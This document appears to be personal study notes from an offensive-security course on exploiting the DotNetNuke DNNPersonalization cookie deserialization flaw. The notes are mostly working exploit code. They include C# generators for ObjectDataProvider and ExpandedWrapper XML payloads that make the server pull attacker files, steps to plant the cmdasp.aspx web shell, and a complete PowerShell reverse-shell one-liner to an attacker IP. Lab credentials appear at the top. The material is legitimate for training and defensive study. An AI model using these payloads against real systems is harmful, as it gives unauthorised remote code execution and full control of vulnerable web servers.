| URL                   | Username      | Password   |
| --------------------- | ------------- | ---------- |
| http://dnn/dotnetnuke | administrator | studentlab |
| rdp://dnn             | administrator | studentlab |
# Serialisation
* Converting data structures into a format that can be stored or transmitted over a data link
* This module covers XMLSerializer: https://docs.microsoft.com/en-us/dotnet/api/system.xml.serialization.xmlserializer?view=netframework-4.7.2
## XMLSerializer Limitations

* It can only serialise *public* properties and fields of an object. 
* Supports a narrow set of objects due to the fact it cannot serialise abstract classes. 
* The type of object needs to be known to *XMLSerializer* at runtime. 
	* If it does not know this it will throw a runtime exception

### Example Serializer
* This Program will serialize the text and save it to the file
```C#
using System;
using System.IO;
using System.Xml.Serialization;  

namespace BasicXMLSerializer
{
    class Program
    {
        static void Main(string[] args)
        {
            MyConsoleText myText = new MyConsoleText();
            myText.text = args[0];
            MySerializer(myText);
        }

        static void MySerializer(MyConsoleText txt)
        {
            var ser = new XmlSerializer(typeof(MyConsoleText));
            TextWriter writer = new StreamWriter("C:\\Users\\Public\\basicXML.txt");
            ser.Serialize(writer, txt);
            writer.Close();
        }
    }
  
    public class MyConsoleText
    {
        private String _text;
        public String text
        {
            get { return _text; }
            set { _text = value; Console.WriteLine("My first console text class says: " + _text); }
        }
    }
}
```
### Example Deserializer
```C#
using System.IO;
using System.Xml.Serialization;
using BasicXMLSerializer;

namespace BasicXMLDeserializer
{
    class Program
    {
        static void Main(string[] args)
        {
           var fileStream = new FileStream(args[0], FileMode.Open,FileAccess.Read);
            var streamReader = new StreamReader(fileStream);
            XmlSerializer serializer = new XmlSerializer(typeof(MyConsoleText));
            serializer.Deserialize(streamReader);
        }
    }
}
```
* Creates an instance of *XMLDeserializer* class with *MyConsoleText* as the object.
**IT NEEDS TO KNOW THE TYPE**

```C#
using System;
using System.IO;
using System.Xml;
using System.Xml.Serialization;

namespace MultiXMLSerializer
{
    class Program
    {
        static void Main(string[] args)
        {
            String txt = args[0];
            int myClass = Int32.Parse(args[1]);
            if (myClass == 1)
            {
                MyFirstConsoleText myText = new MyFirstConsoleText();
                myText.text = txt;
                CustomSerializer(myText);
            }
            else
            {
                MySecondConsoleText myText = new MySecondConsoleText();
                myText.text = txt;
                CustomSerializer(myText);
            }
        }
        static void CustomSerializer(Object myObj)
        {
            XmlDocument xmlDocument = new XmlDocument();
            XmlElement xmlElement = xmlDocument.CreateElement("customRootNode");
            xmlDocument.AppendChild(xmlElement);
            XmlElement xmlElement2 = xmlDocument.CreateElement("item");
            xmlElement2.SetAttribute("objectType", myObj.GetType().AssemblyQualifiedName);
            XmlDocument xmlDocument2 = new XmlDocument();
            XmlSerializer xmlSerializer = new XmlSerializer(myObj.GetType());
            StringWriter writer = new StringWriter();
            xmlSerializer.Serialize(writer, myObj);
            xmlDocument2.LoadXml(writer.ToString());          xmlElement2.AppendChild(xmlDocument.ImportNode(xmlDocument2.DocumentElement, true));
            xmlElement.AppendChild(xmlElement2);
            File.WriteAllText("C:\\Users\\Public\\multiXML.txt", xmlDocument.OuterXml);
        }
    }

    public class MyFirstConsoleText
    {
        private String _text;
        public String text
        {
            get { return _text; }
            set { _text = value; Console.WriteLine("My first console text class says: " + _text); }
        }
    }
      public class MySecondConsoleText
    {
        private String _text;
        public String text
        {
            get { return _text; }
            set { _text = value; Console.WriteLine("My second console text class says: " + _text); }
        }
    }
}
```
* This has the ability to deserialize many objects 
* Each function has the ability to be called allowing for multiple objects
```C#
xmlElement2.SetAttribute("objectType", myObj.GetType().AssemblyQualifiedName);
```
This gets the objects name type based on the object class.  
* Deserializer: 
```C#
using System;
using System.Diagnostics;
using System.IO;
using System.Xml;
using System.Xml.Serialization;
namespace MultiXMLDeserializer
{
    class Program
    {
        static void Main(string[] args)
        {
            String xml = File.ReadAllText(args[0]);
            CustomDeserializer(xml);            
        }
        static void CustomDeserializer(String myXMLString)
        {
            XmlDocument xmlDocument = new XmlDocument();
            xmlDocument.LoadXml(myXMLString);
            foreach (XmlElement xmlItem in xmlDocument.SelectNodes("customRootNode/item"))
            {
                string typeName = xmlItem.GetAttribute("objectType");
                var xser = new XmlSerializer(Type.GetType(typeName));
                var reader = new XmlTextReader(new StringReader(xmlItem.InnerXml));
                xser.Deserialize(reader);
            }
        }
    }
}
```
The de-serializer needs to be aware of both object types to properly process them.
```XML
<customRootNode>
<item objectType="MultiXMLSerializer.MyFirstConsoleText, MultiXMLSerializer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null">
<MyFirstConsoleText xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<text>Serializing first class...</text>
</MyFirstConsoleText>
</item>
</customRootNode>
```
```
C:\Users\Administrator\source\repos\MultiXMLDeserializer\MultiXMLDeserializer\bin\x64\Debug>MultiXMLDeserializer.exe ""C:\Users\Public\multiXML.txt"
My first console text class says: Serializing first class...
```
The following 2 lines use the name of the object to call the appropriate XmlSerialiser instance. 
```C#
string typeName = xmlItem.GetAttribute("objectType");
var xser = new XmlSerializer(Type.GetType(typeName));
```
it is possible to change the contents of the serialized object file, so that rather than deserializing the _MyFirstConsoleClass_ instance, we can deserialize an instance of _MySecondConsoleClass_. In order to accomplish that, our XML file contents should look like this:
```XML
<customRootNode>
<item objectType="MultiXMLSerializer.MySecondConsoleText, MultiXMLSerializer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null">
<MySecondConsoleText xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<text>Serializing first class...</text>
</MySecondConsoleText>
</item>
</customRootNode>
```
```
C:\Users\Administrator\source\repos\MultiXMLDeserializer\MultiXMLDeserializer\bin\x64\Debug>MultiXMLDeserializer.exe ""C:\Users\Public\multiXML.txt"
My second console text class says: Serializing first class...
```
So by changing the name of the XML we are calling a different class. 
* You need the source in order for this to occur. 
## Getting Malicious
```C#
 using System;
 using System.Diagnostics;
 using System.IO;
 using System.Xml;
 using System.Xml.Serialization;
 
 namespace MultiXMLDeserializer
 {
     class Program
     {
         static void Main(string[] args)
         {
             String xml = File.ReadAllText(args[0]);
             CustomDeserializer(xml);            
         }
 
         static void CustomDeserializer(String myXMLString)
         {
             XmlDocument xmlDocument = new XmlDocument();
             xmlDocument.LoadXml(myXMLString);
             foreach (XmlElement xmlItem in xmlDocument.SelectNodes("customRootNode/item"))
             {
                 string typeName = xmlItem.GetAttribute("objectType");
                 var xser = new XmlSerializer(Type.GetType(typeName));
                 var reader = new XmlTextReader(new StringReader(xmlItem.InnerXml));
                 xser.Deserialize(reader);
             }
         }
     }
 
     public class ExecCMD
     {
         private String _cmd;
         public String cmd
         {
             get { return _cmd; }
             set
             {
                 _cmd = value;
                 ExecCommand();
             }
         }
 
         private void ExecCommand()
         {
             Process myProcess = new Process();
             myProcess.StartInfo.FileName = _cmd;
             myProcess.Start();
             myProcess.Dispose();
         }
     }
 }
```
* This serialiser implements the _ExecCMD_ 
```xml
<customRootNode>
<item objectType="MultiXMLDeserializer.ExecCMD, MultiXMLDeserializer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null">
<ExecCMD xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<cmd>calc.exe</cmd>
</ExecCMD>
</item>
</customRootNode>
```
* Exec command just runs the command it is given
* To do this you need to change the object type to call *ExecCMD* and rename the *text* tag. 
# DotNetNukeVulnerability
* Found in the _DNNPersonalization_ cookie
## Overview
* The entry point for this vulnerability is found in the *DotnetNuke.dll*. 
	* The dll is publicly available, source for this module will be used with dnSpy
* **Need to use the 64bit of dnSpy as the dll is 64bit**
![[1bb95b5a1eda583c47acedcd2aa179bc-Picture12a.png]]![[6cd656cb021e626c072d8ab34429b3cb-Picture4.png]]
* Implementation of the *LoadProfile* function
* This function can be triggered when we visit a non existent page. 
* Line 24 the function checks the presence of the DNNPersonalisation cookie in the HTTP request. 
	* If present its value is assigned to the local text string variable on line 26.
* Following the execution path will get you to the Deserialization
![[54b9c9085d8ab9f589ac64b28630b058-Picture5 2.png]]T
* This is a wrapper for the `DeSerialiseHashTable` function.
* The second argument passed in the function call is hard coded as "profile"
![[19e8e34e2b068e6d68883a2224c064d5-Picture6 1.png]]
Implementation of the `DeserialiseHashTable`.
* look for every _item_ node under the _profile_ root XML tag (line 156)
- extract the serialized object type information from the _item_ node "type" attribute (line 160)
- create a _XmlSerializer_ instance based on the extracted object type information (line 161)
- deserialize the user-controlled serialized object (line 163)
No type checking occurs through out this. 
# Manipulation of Assembly Attributes for Debugging
* .NET can be hard to debug
* You cant add breakpoints due to runtime optimisations. 
* Sometimes cant view the local variables.
* Assembly attributes often come with this: 
```
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
```
This can be changed to:
```
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]
```

This can be changed in `dnSpy`
1. Open `C:\inetpub\wwwroot\dotnetnuke\bin\DotNetNuke.dll`
	1. It is important to note that once the IIS worker process starts, it will NOT load the assemblies from this directory. Rather it will make copies of all the required files for DNN to function and will load them from the following directory: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\dotnetnuke\`
![[98dc5ab0f81f888b8ea193dcaf4bda47-Picture41 1.png]]
* Click on _Edit Assembly Attributes (C#)_
![[cf6f17b2c23dd05c2b41f638932736c6-Picture42.png]]Change to what is above
![[bd0bc1c3c5a54f0bd9cfdcde02466776-Picture43 1.png]]
_File_ > _Save Module_
![[be7c1faee9d546eadb07d27020fa4dae-Picture44 1.png]]
# Debugging DotNetNuke Using dnSpy
* need to attach to see how our payloads are running. 
* Attach our `DNSpy` to the `w3wp.exe` - IIS worker process. 
	* May need to browse to site to see it
![[919f3c2172664d81f213e77cbcd77e52-Picture9 1.png]]
* Once attached we need to pause the execution using the appropriate Debug menu or the shortcut menu button. 
* *Debug/Windows/Modules* to list all the modules loaded by the `w3wp.exe` process
![[fdc5cf54234b6e3e46eebdbf90bf2db4-Picture45.png]]
* Right click on any of the modules and then you can access the *Open All Modules* context menu. 
![[987954a7ff3a2a8e888dd9c989c1a8d8-Picture46.png]]
* Once the modules are loaded, we can navigate to the `LoadProfile(int,int)` function located in the `DotNetNuke.Services.Personalization.PersonalizationController` namespace
* Set a breakpoint where our initial analysis started. 
![[e8ac0161195cbbc11ac3593ab24d8174-Picture8.png]]
* Set up the first proof of concept HTTP request.  Send a request through the repeater. 
![[f7560aac1d7d3f5fb6c980b230526c89-Picture10.png]]
* If everything went to plan we should hit the breakpoint in dnSpy.
![[884ee7897ec802fc3246d21146db9a2a-Picture11.png]]
## How did we get here
* We trusted the advisory but did not know of any personalisation data be processed when it is originating from unauthed process. 
* From the breakpoint we can see the stack trace. 
![[8f61db03beb9bdcce07894aa18495962-Picture37.png]]
* Looking backwards a couple of steps from the top we see that the *getter* for the *UserMode* property of the *PortalSettings* class is invoked. 
![[2511ac707a4d3e932e769229deb4e430-Picture38.png]]
* We can reverify that we hit this part by adding another breakpoint. 
* This is located within the if statement for _HttpContext.Current.Request.IsAuthenticated_ boolean.
* We are not authenticated but our cookie is treated as authenticated. 
* Looking further back in the stack trace we see this.
	* `AdvancedUrlReWriter.Handle404OrException`
![[9130879dc1a1324b5340f7ac887ab04c-Picture39.png]]
* If the user is null then it gets assigned to the current thread user. 
![[9d929b826e6a28a76eeea2bedfa78960-Picture40.png]]
*  Is authenticated is true as `IIS\APPPOOL` as the 404 handler is handled before the *HttpContext.UserObject* is set. 

# Payload Options
## FileSystemUtils PutFile Method
* The original advisorysays that the *DotNetNuke.dll* assembly contains a class called *FileSystemUtils* which implements a class called *PullFile*. 
* This can be located in dnSpy.
![[9ed5c430c3b451f72cb73fa0d6f45196-Picture13.png]]![[a2f093359723c14cc5234066a299acbe-Picture14.png]]
We could download an ASPX shell and gain code execution
* However this couldn't be serialised correctly as it cannot serialise class methods, it can only serialise public properties and fields. 
## ObjectDataProvider Class
* This class is used when we want to wrap another object into an ObjectDataProvider instance and use it as a binding source. 
	* A Binding source is simply an object that provides the programmer with relevant data. 
	* This data is usally bound from its source target object such as *User Interface object (TextBox, ComboBox)* etc. 
* This allows you to wrap an arbitrary object and use the MethodName property to call a method from a wrapped object and any parameters. 
* This means we can trigger method calls in a completely different object. 
* The objectDataProvider is defined and implemented int he *System.Windows.Data* namespace, which is located in the *PresentationFramework.dll*. 
	* You may have more than one of these due to the number of .Net installations. 
* here it is located in:
  `C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF`
![[6a956b3404cd511929f19dcd53ea6131-Picture15.png]]
* When the *MethodName* property is set the private *methodName* is set and the *base.Refresh* call takes place. 
![[17965d04c75f1138276f649df78a0695-Picture16.png]]
Refresh calls BeginQuery
![[0703521a5075333be9e96a51e17be5b2-Picture17.png]]
* This seems to be a dead end, but we need to realize that the _ObjectDataProvider_ class inherits from the _DataSourceProvider_ class, which is where dnSpy took us. 
* Therefore, we need to make sure we navigate to the _BeginQuery_ function implementation within the _ObjectDataProvider_ class that overrides the inherited function.
![[38e4c8288db96c0fd81ea23dad2eec41-Picture18.png]]
* At the beginning there is another call, to the *QueryWorker* method. 
![[267e706be6189c9ef037ce314bed4e83-Picture19.png]]
* On line *InvokeMethodOnInstance* is called and where the target method in the wrapped object is invoked. 
### Example Use of ObjectDataProvider Instance
* We want to reuse much of the DNN code so we need to add it as a reference. along with PresentationFramework
![[32fa8dba688686cf924504d0384c3685-Picture20 1.png]]
* We also need a webserver available. 

```C#
 using System;
 using System.IO;
 using System.Xml.Serialization;
 using DotNetNuke.Common.Utilities;
 using System.Windows.Data;
 
 namespace ODPSerializer
 {
     class Program
     {
         static void Main(string[] args)
         {
             ObjectDataProvider myODP = new ObjectDataProvider();
             myODP.ObjectInstance = new FileSystemUtils();
             myODP.MethodName = "PullFile";
             myODP.MethodParameters.Add("http://192.168.119.120/myODPTest.txt");
             myODP.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");
             Console.WriteLine("Done!");
         }
     }
 }
```
* Lines 1-5:
	* we first make sure we set all the appropriate "using" directives to define the required namespaces
* Lines 13: 
	* Create a _ObjectDataProvider_ instance
	- Instruct it to wrap a DNN _FileSystemUtils_ object
	- Instruct it to call the _PullFile_ method
	- Pass two arguments to the above mentioned method as required by its constructor
Compile this with Visual Studio and debug in dnSpy.
`C:\Users\Administrator\source\repos\ODPSerializer\ODPSerializer\bin\Debug\`
![[aae32ff2fabbc2d1927a397dda10c036-Picture25 1.png]]
* Add a break at the entry point
![[76d2e09cf005266009831d42a5b51101-Picture26 1.png]]
* We need to try and verify the *ObjectDataProvider* analysis from earlier. Navigate to `System.Windows.Data.ObjectDataProvider.QueryWorker` function implemented in the *PresentationFramework*
![[376e160567eb4e10dabdac2e62f32bbd-Picture27 1.png]]
* Set a breakpoint on the function call to the *InvokeMethodOnInstance* method identified earlier. 
* Looking at the callstack in dnSpy we can see that the code execution occurred as expected.
![[7778031deb92d473adacb13a9830c172-Picture28 2.png]] 
*  We can see we will hit the breakpoint 3 times as we reach this code 3 times.
* Set the MethodName property which triggers the code chain, we then set the MethodParamters values twice,
* Finally we will see the Server call out to the URL. 
* This confirms code execution to call PullFile.
* We now need to serialise this and deserialise it. 

### Serialisation of the ObjectDataProvider
* Looking at the previous serialisation code, we can add that code to the example. 
* The DNN cookie has to be in the specific format to reach the deserialization call. 
* It must contain the profile node along with the "item" tag, this contains a "type" attribute describing the enclosed object. 
* We can reuse the DNN function that creates this cookie value in the first place: *_SerializeDictionary_* located in *_DotNetNuke.Common.Utilities.XmlUtils_*
```C#
using System;
using System.IO;
using System.Xml.Serialization;
using DotNetNuke.Common.Utilities;
using System.Windows.Data;
using System.Collections;

namespace ODPSerializer
{
    class Program
    {
        static void Main(string[] args)
        {
            ObjectDataProvider myODP = new ObjectDataProvider();
            myODP.ObjectInstance = new FileSystemUtils();
            myODP.MethodName = "PullFile";
            myODP.MethodParameters.Add("http://192.168.119.120/myODPTest.txt");
            myODP.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");
            Hashtable table = new Hashtable();
            table["myTableEntry"] = myODP;
            String payload = "; DNNPersonalization=" + XmlUtils.SerializeDictionary(table, "profile");
            TextWriter writer = new StreamWriter("C:\\Users\\Public\\PullFileTest.txt");
            writer.Write(payload);
            writer.Close();
            Console.WriteLine("Done!");
        }
    }
}
```
1. We create a new hashTableInstance and proceed by adding an entry called "myTableEntry" which we assign our *ObjectDataProviderInstance*
2. We then use the *DNN* function to serialise this object. 
* When we try to compile we get this:
![[55bf6dc9bb3ad20a87a884ffdac78595-Picture32.png]]
Looking into the error we get this: 
![[4a4e6a1492b02860903aa8a3bf756a21-Picture33.png]]
* The serialiser has no context of what *ObjectDataProvider* instance is that we are providing it. 
* We could instantiate a new serialiser with this:
```C#
XmlSerializer xmlSerializer = new XmlSerializer(myODP.GetType(), new Type[] {typeof(FileSystemUtils)});
```
* This would process the serialised the object with the default constructer and not account for the additional object type being generated. 
### Extended Wrapper Class
 * The official documentation states: 
*This class is used internally by the system to implement support for queries with eager loading of related entities. This API supports the product infrastructure and is not intended to be used directly from your code.*

* Looking at the source code doesn't say much either, however the summary states:
```
<summary>Provides a base class implementing IExpandedResult over projections.</summary>
```
#### Projections
Projections (and expansions) are typically found in the world of data providers and databases. Their primary purpose is to reduce the number of interactions between an application and a backend database relative to the number of queries that are executed. In other words, they facilitate data retrieval using JOIN queries, rather than multiple individual queries.[4](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/payload-options-10597/enter-the-dragon-expandedwrapper-class-10705#fn-local_id_111-4)

* data providers need to be able to create objects of arbitrary types
* This is accomplished using the _ExpandedWrapper_ class, which represents a generic object type.
* The constructors for this class allow us to specify the object types of the objects that are encapsulated in a given instance. This is exactly what we need to enable the _XmlSerializer_ to serialize an object properly and solve the issue we encountered previously.
* we can use this class to wrap our source object (_ObjectDataProvider_) into a new object type and provide the properties we need (_ObjectDataProvider.MethodName_ and _ObjectDataProvider.MethodParameters_)
#### Back to code:
```C#
 using System;
 using System.IO;
 using DotNetNuke.Common.Utilities;
 using System.Collections;
 using System.Data.Services.Internal;
 using System.Windows.Data;
 
 namespace ExpWrapSerializer
 {
     class Program
     {
         static void Main(string[] args)
         {
             Serialize();
         }
 
         public static void Serialize()
         {
             ExpandedWrapper<FileSystemUtils, ObjectDataProvider> myExpWrap = new ExpandedWrapper<FileSystemUtils, ObjectDataProvider>();
             myExpWrap.ProjectedProperty0 = new ObjectDataProvider();
             myExpWrap.ProjectedProperty0.ObjectInstance = new FileSystemUtils();
             myExpWrap.ProjectedProperty0.MethodName = "PullFile";
             myExpWrap.ProjectedProperty0.MethodParameters.Add("http://192.168.119.120/myODPTest.txt");
             myExpWrap.ProjectedProperty0.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");
 
 
             Hashtable table = new Hashtable();
             table["myTableEntry"] = myExpWrap;
             String payload = XmlUtils.SerializeDictionary(table, "profile");
             TextWriter writer = new StreamWriter("C:\\Users\\Public\\ExpWrap.txt");
             writer.Write(payload);
             writer.Close();
 
             Console.WriteLine("Done!");
         }
 
     }
 }
```
* instead of using the _ObjectDataProvider_ directly, we are now instantiating an object of type _ExpandedWrapper<FileSystemUtils, ObjectDataProvider>_
* Furthermore, we use the generic _ProjectedProperty0_ property to create an _ObjectDataProvider_ instance

The serialised object now looks like this:
```XML
<profile><item key="myTableEntry" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral, PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><ProjectedProperty0><ObjectInstance xsi:type="FileSystemUtils" /><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">http://192.168.119.120/myODPTest.txt</anyType><anyType xsi:type="xsd:string">C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>
```
* To test this can be deserialised:
```C#
 using System;
 using System.IO;
 using DotNetNuke.Common.Utilities;
 using DotNetNuke.Common;
 using System.Collections;
 using System.Data.Services.Internal;
 using System.Windows.Data;
 
 namespace ExpWrapSerializer
 {
     class Program
     {
         static void Main(string[] args)
         {
             //Serialize();
             Deserialize();
         }
 
         public static void Deserialize()
         {
             string xmlSource = System.IO.File.ReadAllText("C:\\Users\\Public\\ExpWrap.txt");
             Globals.DeserializeHashTableXml(xmlSource);
         }
 
         public static void Serialize()
         {
             ExpandedWrapper<FileSystemUtils, ObjectDataProvider> myExpWrap = new ExpandedWrapper<FileSy
             myExpWrap.ProjectedProperty0 = new ObjectDataProvider();
             myExpWrap.ProjectedProperty0.ObjectInstance = new FileSystemUtils();
             myExpWrap.ProjectedProperty0.MethodName = "PullFile";
             myExpWrap.ProjectedProperty0.MethodParameters.Add("http://192.168.119.120/myODPTest.txt");
             myExpWrap.ProjectedProperty0.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTe
 
 
             Hashtable table = new Hashtable();
             table["myTableEntry"] = myExpWrap;
             String payload = XmlUtils.SerializeDictionary(table, "profile");
             TextWriter writer = new StreamWriter("C:\\Users\\Public\\ExpWrap.txt");
             writer.Write(payload);
             writer.Close();
 
             Console.WriteLine("Done!");
         }
 
     }
 }
```
* Set a breakpoint on the *InvokeMember* function call inside _ObjectDataProvider.InvokeMethodOnInstance_ we can indeed validate that the deseriaizle is proceeding as we hoped for by looking at the call stack.
![[34ea07badf100cae72715a124ef9f035-Picture34 1.png]]
![[6b58ec62ed72af612d03557e78501b65-Picture29a.png]]
##  Putting it all together
* Web shell:
```Bash
locate cmdasp.aspx
```
```
/usr/share/webshells/aspx/cmdasp.aspx
```
```
sudo cp /usr/share/webshells/aspx/cmdasp.aspx /var/www/html/
```
```
sudo chmod 644 /var/www/html/cmdasp.aspx
```


* Updated XML
```XML
<profile><item key="myTableEntry" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral, PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><ProjectedProperty0><ObjectInstance xsi:type="FileSystemUtils" /><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">http://192.168.119.120/cmdasp.aspx</anyType><anyType xsi:type="xsd:string">C:/inetpub/wwwroot/dotnetnuke/cmdasp.aspx</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>
```
* Powershell oneliner:
```Powershell
$client = New-Object System.Net.Sockets.TCPClient('192.168.119.120',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
```

Turn it into base64